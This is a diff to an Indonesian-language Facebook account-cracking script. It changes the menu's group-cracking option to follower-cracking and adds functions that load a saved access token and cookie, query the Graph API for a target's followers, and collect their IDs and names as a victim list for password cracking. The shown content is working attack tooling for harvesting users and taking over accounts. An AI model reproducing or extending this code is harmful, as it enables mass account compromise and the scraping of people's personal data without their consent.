@@ -742,7 +742,7 @@ def menu(my_name,my_id):
     prints(Panel(f"""{P2}
 [{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari pencarian nama
 [{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
-[{color_text}03{P2}]. crack dari id Group    [{color_text}07{P2}]. crack dari File
+[{color_text}03{P2}]. crack dari id Pengikut    [{color_text}07{P2}]. crack dari File
 [{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari opsi CP""",width=80,padding=(0,6),style=f"{color_panel}"))
     prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
@@ -753,7 +753,7 @@ def menu(my_name,my_id):
     elif HaHi in ['2','02']:
         massal()
     elif HaHi in ['3','03']:
-        crack_group()
+        pengikut()
     elif HaHi in ['4','04']:
         clon_email()
     elif HaHi in ['5','05']:
@@ -949,6 +949,61 @@ def kocak(url,cokies):
 			
 ###----------[ DUMP PENGIKUT ]---------- ###
 def pengikut():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	ses = requests.Session()
+	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold green"))
+	akun = console.input(f' ╰─  Masukan Id Target : ')
+	try:
+		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
+		for pi in koh2['subscribers']['data']:
+			try:
+			    id.append(pi['id']+'|'+pi['name'])
+			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    time.sleep(0.0002)
+			except:continue
+		print("\r")
+		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold yellow"))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f" ╰─  Koneksi Internet Anda Bermasalah")
+		time.sleep(3);exit()
+	except (KeyError,IOError):
+		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
+		time.sleep(3);exit()
+		
+def pengikut1():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	ses = requests.Session()
+	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold Blue"))
+	akun = wa.input(f' [+] Masukan Id Target : ')
+	try:
+		koh2 = ses.get(f'https://graph.facebook.com/v15.0/{akun}?fields=subscribers.limit(999999)&access_token={token}',cookies={'cookie': cok}).json()
+		for pi in koh2['subscribers']['data']:
+			try:
+			    id.append(pi['id']+'|'+pi['name'])
+			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    time.sleep(0.0002)
+			except:continue
+		print("\r")
+		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f" [+] Koneksi Internet Anda Bermasalah")
+		time.sleep(3);exit()
+	except (KeyError,IOError):
+		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
+		time.sleep(3);exit()
+
+
+def pengikut2():
 	try:
 		token = open('.token.txt','r').read()
 		cookie = open('.cok.txt','r').read()
